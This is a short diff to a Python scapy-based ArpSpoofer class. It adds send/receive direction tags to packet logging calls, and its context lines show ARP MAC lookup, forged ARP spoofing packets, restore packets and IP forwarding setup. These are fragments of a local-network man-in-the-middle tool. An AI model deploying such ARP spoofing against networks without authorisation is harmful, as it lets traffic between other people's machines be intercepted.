@@ -96,12 +96,12 @@ class ArpSpoofer:
         arp_request = scapy.ARP(pdst=ip)
         broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
         packet = broadcast / arp_request
-        self.buffer.put("arp", "MAC address request", packet)
+        self.buffer.put("arp", "MAC address request", packet, "send")
 
         answered, _ = scapy.srp(packet, timeout=2, verbose=False)
 
         if answered:
-            self.buffer.put("arp", "MAC address response", answered[0][1])
+            self.buffer.put("arp", "MAC address response", answered[0][1], "recv")
             return answered[0][1].hwsrc
 
 
@@ -113,7 +113,7 @@ class ArpSpoofer:
         psrc=spoof_ip
         )
 
-        self.buffer.put("arp", "Spoofing packet", packet)
+        self.buffer.put("arp", "Spoofing packet", packet, "send")
         scapy.sendp(packet, verbose=False)
 
 
@@ -133,10 +133,10 @@ class ArpSpoofer:
             hwsrc=source_mac
         )
 
-        self.buffer.put("arp", "Restore packet", packet)
+        self.buffer.put("arp", "Restore packet", packet, "send")
         scapy.sendp(packet, verbose=False)
 
-    
+
     def enable_ip_forwarding(self):
         if self.os_name == "Windows":
             # IP Forwarding is maybe possible
